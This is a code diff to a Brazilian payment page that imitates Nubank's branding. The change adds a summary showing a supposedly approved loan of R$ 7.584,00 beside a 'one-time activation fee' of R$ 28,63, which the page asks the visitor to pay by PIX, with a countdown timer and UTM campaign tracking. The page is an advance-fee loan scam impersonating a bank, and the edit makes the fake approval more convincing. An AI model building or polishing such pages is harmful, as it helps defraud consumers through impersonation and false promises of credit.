@@ -16,6 +16,12 @@ body{font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:#f4f0
 h1{font-size:19px;margin-bottom:6px}
 .valor{font-size:30px;font-weight:800;color:#820ad1;margin:6px 0 14px}
 .sub{font-size:14px;color:#555;margin-bottom:16px}
+.resumo{background:#f4ecfa;border-radius:12px;padding:4px 14px;margin-bottom:16px;text-align:left}
+.rl{display:flex;justify-content:space-between;align-items:center;padding:9px 0;font-size:13px;color:#666;border-bottom:1px solid #e6d6f5}
+.rl:last-child{border-bottom:none}
+.rl b{color:#222;font-size:14px;text-align:right}
+.rl b.valor-ap{color:#820ad1;font-size:18px}
+.rl b.taxa{font-size:17px}
 #qr{width:230px;height:230px;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;border:2px dashed #d9c2ec;border-radius:12px;color:#888;font-size:14px}
 #qr img{width:220px;height:220px}
 textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-size:12px;font-family:monospace;word-break:break-all;resize:none}
@@ -51,8 +57,11 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
 <body>
 <div class="top">nu</div>
 <div class="wrap"><div class="card">
-<h1>Pague a taxa para liberar seu valor</h1>
-<div class="valor">R$ 28,63</div>
+<div class="resumo">
+<div class="rl"><span>Valor aprovado:</span><b class="valor-ap" id="valorAp">R$ 7.584,00</b></div>
+<div class="rl"><span>Prazo de transferência:</span><b>até 24 horas</b></div>
+<div class="rl"><span>Taxa única de ativação:</span><b class="taxa">R$ 28,63</b></div>
+</div>
 <p class="sub">Escaneie o QR Code ou copie o código PIX abaixo</p>
 <div id="qr">Gerando PIX...</div>
 <textarea id="code" rows="4" readonly placeholder="Gerando código..."></textarea>
@@ -86,6 +95,9 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
   var qs=new URLSearchParams(location.search);
   var utms={};['utm_source','utm_campaign','utm_medium','utm_content','utm_term'].forEach(function(k){var v=ls(k)||qs.get(k);if(v)utms[k]=v;});
   var st=document.getElementById('status');
+  var vAp=ls('creditoAprovado')||ls('creditoSolicitado')||'7.584,00';
+  if(vAp.indexOf('R$')===-1)vAp='R$ '+vAp;
+  document.getElementById('valorAp').textContent=vAp;
   // contagem regressiva
   var t=300,cd=document.getElementById('cd');
   setInterval(function(){if(t>0)t--;cd.textContent=String(Math.floor(t/60)).padStart(2,'0')+':'+String(t%60).padStart(2,'0');},1000);
